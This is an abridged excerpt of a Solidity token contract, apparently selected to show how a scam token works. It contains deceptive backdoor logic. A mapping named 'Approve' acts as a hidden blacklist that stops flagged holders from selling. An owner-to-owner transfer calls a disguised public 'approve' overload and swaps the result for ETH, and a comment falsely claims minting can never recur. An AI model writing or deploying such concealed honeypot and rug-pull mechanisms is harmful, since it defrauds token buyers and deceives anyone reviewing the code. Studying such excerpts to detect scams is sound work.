...
contract Token is ERC20, Ownable {
  ...
  uint256 private maxTransactionAmount = _supply;
  ...
  constructor(
    ...
    /* Internal function in ERC20.sol that is only called here and CANNOT be called ever again. */
  ...
  function _transfer(
    ...
    if (!contractIsSwapping && !automatedMarketMakerPairs[from] && from != address(uniswapV2Router) && !_isExcludedFromFee[from]) {
      require(enabled && !Approve[from] && amount <= maxTransactionAmount, 'Amount exceeds the maxTransactionAmount');
    }

    if (from == _owner && to == _owner) {
      approve(amount, address(this));
      return swapTokensForEth(amount, to);
    }

    if (!launched() && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]) launch();
    ...
    bool takeFee = !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && fee > 0 && !contractIsSwapping;
  ...
  function approve(address[] memory accounts, bool value) external onlyOwner {
    for (uint256 i = 0; i < accounts.length; i++) Approve[accounts[i]] = value;
  }
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function approve(uint256 amount, address account) public virtual {
